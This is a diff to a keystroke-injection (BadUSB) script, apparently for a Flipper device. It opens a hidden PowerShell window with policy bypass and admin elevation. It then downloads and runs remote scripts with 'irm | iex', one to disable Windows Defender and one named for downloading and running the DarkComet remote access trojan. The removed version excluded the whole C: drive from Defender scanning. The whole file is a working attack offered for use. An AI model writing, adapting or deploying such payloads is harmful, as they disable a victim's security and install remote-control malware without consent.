@@ -7,7 +7,7 @@ DEFAULT_DELAY 100
 REM open powershell (remove -W Hidden to show the window).
 GUI r
 DELAY 750
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:Temp;Add-MpPreference -ExclusionPath C:/;Start-Sleep 1;;exit
+STRING powershell -NoP -Ep Bypass -W H -C irm https://github.com/knoxoxen/flipperstuffs/raw/main/disable-defender.ps1 | iex
 CTRL-SHIFT ENTER
 DELAY 3000
 ALT y
@@ -20,6 +20,7 @@ DELAY 1000
 GUI r
 DELAY 750
 STRING powershell -NoP -Ep Bypass -W H -C irm https://github.com/knoxoxen/flipperstuffs/raw/main/download%20and%20run%20darkcommet.ps1 | iex
-ENTER
-
+CTRL-SHIFT ENTER 
+DELAY 3000
+ALT y
 
